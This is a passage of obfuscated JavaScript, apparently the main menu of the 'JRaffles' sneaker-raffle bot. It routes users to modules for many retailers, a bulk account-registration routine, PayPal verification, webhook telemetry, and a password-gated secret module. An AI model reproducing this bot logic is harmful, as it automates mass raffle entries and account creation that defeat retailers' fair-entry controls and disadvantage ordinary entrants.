                    }
                    if (_0x215d09['Answer']['toLowerCase']() == 'n') {
                        console['clear'](), console['log']('Returning\x20to\x20Main\x20Menu'), await _0x101cd5(0x3e8);
                        return;
                    }
                    return console['clear'](), console['log']('Invalid\x20Input'), await _0x101cd5(0x3e8), this['function']();
                }
            }
        ]
    },
    { 'name': 'Paypal\x20Verification' },
    { 'name': 'Change\x20Settings' },
    { 'name': 'Reload\x20Settings' }
];
async function _0x41a6fb(_0x57891f) {
    var _0x640c48 = await _0x3fe8ad(), _0x59bfb4 = _0x467c3c['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x54b572 = _0x416c9b['parse'](_0x59bfb4, { 'header': !![] })['data'];
    for (var _0x2f257d = 0x0; _0x2f257d < _0x54b572['length']; _0x2f257d++) {
        var _0x3bc85b = _0x54b572[_0x2f257d]['Store'], _0x2c1bd0 = _0x54b572[_0x2f257d]['Mode'];
        for (var _0x6840c1 of _0x2db3d) {
            const _0xc9c857 = _0x6840c1['name']['includes'](_0x3bc85b);
            if (_0xc9c857)
                for (mode of _0x2db3d[_0x6840c1]['modules']) {
                    const _0x220b7f = mode['name']['includes'](_0x2c1bd0);
                    _0x220b7f && (_0x57891f = mode['name'], await mode['function'](_0x57891f, _0x54b572[_0x2f257d], _0x640c48));
                }
        }
    }
}
async function _0x3e6938() {
    await _0x38bce6(), console['clear']();
    if (_0x300b57 != 'devkey') {
        let _0x4f4eeb = await _0x374a8b['autoUpdate']();
        if (_0x4f4eeb === 'yes')
            return _0x66bc65('node\x20JRaffles.js');
        console['clear']();
    }
    if (_0x693ba2 == '') {
        console['log']('No\x20key\x20found\x20in\x20settings.json');
        return await _0x101cd5(0x2710);
        ;
    }
    await _0x4f6800(_0x693ba2);
    if (_0x3b4b14 === ![])
        return console['log']('Closing\x20Browser'), await _0x101cd5(0xbb8);
    else
        try {
            var _0x2ab3ca = [{
                'type': 'rich',
                'title': 'User\x20Opened\x20JRaffles',
                'description': '',
                'color': 0xc0d6d6,
                'fields': [
                    {
                        'name': 'User',
                        'value': '' + _0x5b6a98
                    },
                    {
                        'name': 'Version',
                        'value': '' + _0x300b57
                    }
                ]
            }];
            const _0xe714d8 = { 'embeds': _0x2ab3ca };
            var _0x1ea6d2 = await _0x42c912(null, null, 'open', ![]);
            const _0x15d8a2 = { 'openDEVMSG': { 'embeds': [_0x1ea6d2] } };
            await _0x3b1b09(_0x49d8e2, _0x15d8a2['openDEVMSG']);
            async function _0x39a2f8() {
                _0x18a4ea('JRaffles\x20' + _0x300b57), console['clear'](), console['log']('Hello\x20' + _0x1ee8dd['cyan']('' + _0x5b6a98) + ',\x20Welcome\x20to\x20JRaffles\x20' + _0x300b57), console['log']('Choose\x20a\x20Module\x20to\x20run..\x0a');
                for (var _0x1a8e93 = 0x0; _0x1a8e93 < _0x2db3d['length'] - 0x4; _0x1a8e93++) {
                    if (_0x1a8e93 >= 0xa) {
                        console['log']('\x20(' + _0x1a8e93 + ')\x20[' + _0x2db3d[_0x1a8e93]['name'] + ']');
                        continue;
                    }
                    if (_0x2db3d[_0x1a8e93]['name'] === 'Reload\x20Settings' || _0x2db3d[_0x1a8e93]['name'] === 'Change\x20Settings')
                        continue;
                    else
                        console['log']('\x20(' + _0x1a8e93 + ')\x20\x20[' + _0x2db3d[_0x1a8e93]['name'] + ']');
                }
                ;
                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('\x20(' + (_0x2db3d['length'] - 0x4) + ')\x20Failed\x20Tasks'), console['log']('\x20(' + (_0x2db3d['length'] - 0x3) + ')\x20Paypal\x20Verification'), console['log']('\x20(' + (_0x2db3d['length'] - 0x2) + ')\x20Change\x20Settings'), console['log']('\x20(' + (_0x2db3d['length'] - 0x1) + ')\x20Reload\x20Settings'), console['log'](''), taskModule = await _0x574580();
                if (taskModule > _0x2db3d['length'] - 0x1 || isNaN(taskModule) == !![])
                    return console['log']('Invalid\x20selection'), await _0x101cd5(0x3e8), _0x39a2f8();
                if (_0x2db3d[taskModule]['name'] == 'BSTN') {
                    taskFunction = await _0x3e5094(_0x2db3d[taskModule]['modules']);
                    var _0x261bab = _0x2db3d[taskModule]['modules'][taskFunction];
                    console['clear']();
                    try {
                        if (taskFunction == 0x3) {
                            var _0x365a29 = await _0x3fe8ad();
                            await _0x261bab['function'](_0x261bab, _0x365a29);
                        }
                        if (taskFunction == 0x2) {
                            var _0x365a29 = await _0x3fe8ad(), _0xadfa53 = await _0x2cac6f(_0x261bab);
                            _0x5b5c1b['shuffleTasks'] && await _0x2539fa(_0xadfa53), await _0x261bab['function'](_0x261bab, _0xadfa53, _0x365a29);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x365a29 = await _0x3fe8ad(), _0xadfa53 = await _0x2cac6f(_0x261bab);
                                _0x5b5c1b['shuffleTasks'] && await _0x2539fa(_0xadfa53), await _0x261bab['function'](_0x261bab, _0xadfa53, _0x365a29);
                            } else {
                                if (taskFunction == 0x1) {
                                    var _0x365a29 = await _0x3fe8ad();
                                    await _0x261bab['function'](_0x261bab, _0x365a29);
                                }
                            }
                        }
                    } catch (_0x5470b1) {
                        console['log'](_0x5470b1), await _0x101cd5(0x7d0);
                    }
                    return _0x39a2f8();
                }
                if (_0x2db3d[taskModule]['name'] == 'FENOM') {
                    try {
                        taskFunction = await _0x3e5094(_0x2db3d[taskModule]['modules']);
                        var _0x261bab = _0x2db3d[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x365a29 = await _0x3fe8ad(), _0xe5fc5e = await _0x2cac6f(_0x261bab);
                            _0x5b5c1b['shuffleTasks'] && await _0x2539fa(_0xe5fc5e), await _0x261bab['function'](_0x261bab, _0xe5fc5e, _0x365a29);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x365a29 = await _0x3fe8ad(), _0xe5fc5e = await _0x2cac6f(_0x261bab);
                                _0x5b5c1b['shuffleTasks'] && await _0x2539fa(_0xe5fc5e), await _0x261bab['function'](_0x261bab, _0xe5fc5e, _0x365a29);
                            }
                        }
                    } catch (_0x387be0) {
                        console['log'](_0x387be0), await _0x101cd5(0xfa0);
                    }
                    return _0x39a2f8();
                }
                if (_0x2db3d[taskModule]['name'] == 'Overkill') {
                    try {
                        taskFunction = await _0x3e5094(_0x2db3d[taskModule]['modules']);
                        var _0x261bab = _0x2db3d[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x365a29 = await _0x3fe8ad(), _0xe5fc5e = await _0x2cac6f(_0x261bab);
                            _0x5b5c1b['shuffleTasks'] && await _0x2539fa(_0xe5fc5e), await _0x261bab['function'](_0x261bab, _0xe5fc5e, _0x365a29);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x365a29 = await _0x3fe8ad(), _0xe5fc5e = await _0x2cac6f(_0x261bab);
                                _0x5b5c1b['shuffleTasks'] && await _0x2539fa(_0xe5fc5e), await _0x261bab['function'](_0x261bab, _0xe5fc5e, _0x365a29);
                            }
                        }
                    } catch (_0x5dabcc) {
                        console['log'](_0x5dabcc), await _0x101cd5(0xfa0);
                    }
                    return _0x39a2f8();
                }
                if (_0x2db3d[taskModule]['name'] == '4ELEMENTOS') {
                    taskFunction = await _0x3e5094(_0x2db3d[taskModule]['modules']);
                    var _0x261bab = _0x2db3d[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x1) {
                        var _0x365a29 = await _0x3fe8ad();
                        return await _0x261bab['function'](_0x261bab, _0x365a29), _0x39a2f8();
                    }
                    var _0x365a29 = await _0x3fe8ad(), _0x1bd278 = await _0x2cac6f(_0x261bab);
                    return _0x5b5c1b['shuffleTasks'] && await _0x2539fa(_0x1bd278), await _0x261bab['function'](_0x261bab, _0x1bd278, _0x365a29), _0x39a2f8();
                }
                if (_0x2db3d[taskModule]['name'] == 'OneBlockDown') {
                    taskFunction = await _0x3e5094(_0x2db3d[taskModule]['modules']);
                    var _0x261bab = _0x2db3d[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x365a29 = await _0x3fe8ad(), _0x1bd278 = await _0x2cac6f(_0x261bab);
                    return _0x5b5c1b['shuffleTasks'] && await _0x2539fa(_0x1bd278), await _0x261bab['function'](_0x261bab, _0x1bd278, _0x365a29), _0x39a2f8();
                }
                if (_0x2db3d[taskModule]['name'] == 'AFEW\x20Store') {
                    taskFunction = await _0x3e5094(_0x2db3d[taskModule]['modules']);
                    var _0x261bab = _0x2db3d[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x365a29 = await _0x3fe8ad(), _0x1bd278 = await _0x2cac6f(_0x261bab);
                    return _0x5b5c1b['shuffleTasks'] && await _0x2539fa(_0x1bd278), await _0x261bab['function'](_0x261bab, _0x1bd278, _0x365a29), _0x39a2f8();
                }
                if (_0x2db3d[taskModule]['name'] == 'EQL') {
                    taskFunction = await _0x3e5094(_0x2db3d[taskModule]['modules']);
                    var _0x261bab = _0x2db3d[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x365a29 = await _0x3fe8ad(), _0x1bd278 = await _0x2cac6f(_0x261bab);
                    return _0x5b5c1b['shuffleTasks'] && await _0x2539fa(_0x1bd278), await _0x261bab['function'](_0x261bab, _0x1bd278, _0x365a29), _0x39a2f8();
                } else {
                    if (_0x2db3d[taskModule]['name'] == 'MAHA\x20Amsterdam') {
                        taskFunction = await _0x3e5094(_0x2db3d[taskModule]['modules']);
                        var _0x261bab = _0x2db3d[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x0) {
                            var _0x365a29 = await _0x3fe8ad(), _0x563762 = await _0x2cac6f(_0x261bab);
                            return _0x5b5c1b['shuffleTasks'] && await _0x2539fa(_0x563762), await _0x261bab['function'](_0x261bab, _0x563762, _0x365a29), _0x39a2f8();
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x365a29 = await _0x3fe8ad();
                                return await _0x261bab['function'](_0x261bab, null, _0x365a29), _0x39a2f8();
                            }
                        }
                        ;
                    } else {
                        if (_0x2db3d[taskModule]['name'] == 'FOOTSHOP') {
                            taskFunction = await _0x3e5094(_0x2db3d[taskModule]['modules']);
                            var _0x261bab = _0x2db3d[taskModule]['modules'][taskFunction], _0x365a29 = await _0x3fe8ad(), _0x18b511 = await _0x2cac6f(_0x261bab);
                            return _0x5b5c1b['shuffleTasks'] && await _0x2539fa(_0x18b511), await _0x261bab['function'](_0x261bab, _0x18b511, _0x365a29), await _0x101cd5(0x1388), _0x39a2f8();
                        } else {
                            if (_0x2db3d[taskModule]['name'] == 'OQIUM\x20Store') {
                                taskFunction = await _0x3e5094(_0x2db3d[taskModule]['modules']);
                                var _0x261bab = _0x2db3d[taskModule]['modules'][taskFunction];
                                console['clear']();
                                if (taskFunction == 0x0) {
                                    var _0x365a29 = await _0x3fe8ad(), _0x563762 = await _0x2cac6f(_0x261bab);
                                    return _0x5b5c1b['shuffleTasks'] && await _0x2539fa(_0x563762), await _0x261bab['function'](_0x261bab, _0x563762, _0x365a29), _0x39a2f8();
                                } else {
                                    if (taskFunction == 0x1) {
                                        var _0x365a29 = await _0x3fe8ad();
                                        return await _0x261bab['function'](_0x261bab, null, _0x365a29), _0x39a2f8();
                                    }
                                }
                                ;
                            } else {
                                if (_0x2db3d[taskModule]['name'] == 'BOUNCEWEAR') {
                                    taskFunction = await _0x3e5094(_0x2db3d[taskModule]['modules']);
                                    var _0x261bab = _0x2db3d[taskModule]['modules'][taskFunction];
                                    console['clear']();
                                    if (taskFunction == 0x0)
                                        await bwAcc('https://bouncewear.com/nl/account/register', _0x261bab);
                                    else {
                                        if (taskFunction == 0x1) {
                                        }
                                    }
                                    ;
                                } else {
                                    if (_0x2db3d[taskModule]['name'] == 'PATTA') {
                                        taskFunction = await _0x3e5094(_0x2db3d[taskModule]['modules']);
                                        var _0x261bab = _0x2db3d[taskModule]['modules'][taskFunction];
                                        console['clear']();
                                        if (taskFunction == 0x0) {
                                            var _0x365a29 = await _0x3fe8ad(), _0x3ac5a7 = await _0x2cac6f(_0x261bab);
                                            return _0x5b5c1b['shuffleTasks'] && await _0x2539fa(_0x3ac5a7), await _0x261bab['function'](_0x261bab, _0x3ac5a7, _0x365a29), _0x39a2f8();
                                        } else {
                                            if (taskFunction == 0x1) {
                                                var _0x365a29 = await _0x3fe8ad(), _0x3ac5a7 = await _0x2cac6f(_0x261bab);
                                                return _0x5b5c1b['shuffleTasks'] && await _0x2539fa(_0x3ac5a7), await _0x261bab['function'](_0x261bab, _0x3ac5a7, _0x365a29), _0x39a2f8();
                                            }
                                        }
                                        ;
                                    } else {
                                        if (_0x2db3d[taskModule]['name'] == 'SLAM\x20JAM') {
                                            taskFunction = await _0x3e5094(_0x2db3d[taskModule]['modules']);
                                            var _0x261bab = _0x2db3d[taskModule]['modules'][taskFunction];
                                            console['clear']();
                                            if (taskFunction == 0x0) {
                                                var _0x365a29 = await _0x3fe8ad(), _0x3ce3ed = await _0x2cac6f(_0x261bab);
                                                return _0x5b5c1b['shuffleTasks'] && await _0x2539fa(_0x3ce3ed), await _0x261bab['function'](_0x261bab, _0x3ce3ed, _0x365a29), _0x39a2f8();
                                            } else {
                                                if (taskFunction == 0x1) {
                                                    var _0x365a29 = await _0x3fe8ad(), _0x3ce3ed = await _0x2cac6f(_0x261bab);
                                                    return _0x5b5c1b['shuffleTasks'] && await _0x2539fa(_0x3ce3ed), await _0x261bab['function'](_0x261bab, _0x3ce3ed, _0x365a29), _0x39a2f8();
                                                }
                                            }
                                            ;
                                        } else {
                                            if (_0x2db3d[taskModule]['name'] == 'KICKZ') {
                                                taskFunction = await _0x3e5094(_0x2db3d[taskModule]['modules']);
                                                var _0x261bab = _0x2db3d[taskModule]['modules'][taskFunction];
                                                console['clear']();
                                                if (taskFunction == 0x0) {
                                                    var _0x365a29 = await _0x3fe8ad(), _0x4b32bb = await _0x2cac6f(_0x261bab);
                                                    return _0x5b5c1b['shuffleTasks'] && await _0x2539fa(_0x4b32bb), await _0x261bab['function'](_0x261bab, _0x4b32bb, _0x365a29), _0x39a2f8();
                                                } else {
                                                    if (taskFunction == 0x1) {
                                                        var _0x365a29 = await _0x3fe8ad(), _0x4b32bb = await _0x2cac6f(_0x261bab);
                                                        return _0x5b5c1b['shuffleTasks'] && await _0x2539fa(_0x4b32bb), await _0x261bab['function'](_0x261bab, _0x4b32bb, _0x365a29), _0x39a2f8();
                                                    }
                                                }
                                                ;
                                            } else {
                                                if (_0x2db3d[taskModule]['name'] == 'JD') {
                                                    taskFunction = await _0x3e5094(_0x2db3d[taskModule]['modules']);
                                                    var _0x261bab = _0x2db3d[taskModule]['modules'][taskFunction];
                                                    console['clear']();
                                                    if (taskFunction == 0x0) {
                                                        var _0x365a29 = await _0x3fe8ad(), _0xb8cb2 = await _0x2cac6f(_0x261bab);
                                                        return _0x5b5c1b['shuffleTasks'] && await _0x2539fa(_0xb8cb2), await _0x261bab['function'](_0x261bab, _0xb8cb2, _0x365a29), _0x39a2f8();
                                                    }
                                                } else {
                                                    if (_0x2db3d[taskModule]['name'] == 'Seven\x20Store')
                                                        return console['log']('returning\x20to\x20menu'), await _0x101cd5(0x3e8), _0x39a2f8();
                                                    else {
                                                        if (_0x2db3d[taskModule]['name'] == 'Paypal\x20Verification') {
                                                            var _0x4c7cc1 = _0x2db3d[taskModule]['name'], _0x365a29 = await _0x3fe8ad();
                                                            return await _0x35c7d6(_0x4c7cc1, _0x365a29), _0x39a2f8();
                                                        } else {
                                                            if (_0x2db3d[taskModule]['name'] == 'Failed\x20Tasks') {
                                                                taskFunction = await _0x3e5094(_0x2db3d[taskModule]['modules']);
                                                                var _0x261bab = _0x2db3d[taskModule]['modules'][taskFunction];
                                                                return await _0x261bab['function'](_0x261bab), _0x39a2f8();
                                                            } else {
                                                                if (_0x2db3d[taskModule]['name'] == 'Change\x20Settings') {
                                                                    console['log']('Choose\x20a\x20Setting\x20to\x20change\x20:\x0a');
                                                                    var _0x12b8c9 = 0x0;
                                                                    for (const _0x47ce35 in _0x5b5c1b) {
                                                                        console['log']('(' + _0x12b8c9 + ')\x20' + _0x47ce35 + '\x20:\x20' + _0x5b5c1b[_0x47ce35]), _0x12b8c9++;
                                                                    }
                                                                    console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('(' + _0x12b8c9 + ')\x20Return\x20to\x20Main\x20Menu');
                                                                    var _0x1ebabc = await _0x4659d4();
                                                                    if (_0x1ebabc == _0x12b8c9)
                                                                        return _0x39a2f8();
                                                                    console['clear'];
                                                                    var _0x3f62d5 = 0x0;
                                                                    for (var _0x3945f6 in _0x5b5c1b) {
                                                                        if (_0x1ebabc == _0x3f62d5) {
                                                                            console['log']('Changing:\x20\x0a\x20\x0a\x20' + _0x3945f6 + '\x20:'), _0x5b5c1b[_0x3945f6] = await _0x29f821(), _0x467c3c['writeFileSync']('../settings.json', JSON['stringify'](_0x5b5c1b));
                                                                            break;
                                                                        } else
                                                                            _0x3f62d5++;
                                                                    }
                                                                    return console['log']('Settings\x20Saved!'), await _0x101cd5(0xbb8), _0x39a2f8();
                                                                } else {
                                                                    if (_0x2db3d[taskModule]['name'] == 'Reload\x20Settings')
                                                                        return console['log']('Reloading\x20settings'), await _0x38bce6(), _0x39a2f8();
                                                                    else {
                                                                        if (taskModule == 0x45) {
                                                                            _0x2db3d[0x45] = { 'name': 'AFEW\x20SECRET' };
                                                                            var _0x55d90b = await _0x45b34b();
                                                                            _0x55d90b == 'ModuleVoorDeBoys' ? (await afewScraper(), await _0x453212(), await afewFunction(_0x590300[_0x4f0f02], 'sec')) : (console['log']('Wrong\x20password,\x20closing\x20in\x2010\x20seconds...'), await _0x101cd5(0xbb8));
                                                                        } else {
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            try {
                await _0x39a2f8();
            } catch (_0x5d7198) {
                return console['log'](_0x5d7198), _0x39a2f8();
            }
        } catch (_0x4bd781) {
            return console['log'](_0x4bd781), await _0x101cd5(0x3a98);
        }
}
;
_0x18a4ea('JRaffles\x20' + _0x300b57), _0x38bce6();
try {
    _0x3e6938();
} catch (_0x147746) {
    var _0x17784c = [{
        'type': 'rich',
        'title': 'Main\x20Menu\x20Error',
        'description': '',
        'color': 0xc0d6d6,
        'fields': [
            {
                'name': 'User',
                'value': '' + _0x5b6a98
            },
            {
                'name': 'Version',
                'value': '' + _0x300b57
            },
            {
                'name': 'Error',
                'value': '' + _0x147746
            }
        ]
    }];
    const _0x4eface = { 'embeds': _0x17784c };
    _0x3b1b09(_0x57f30c, _0x4eface);
}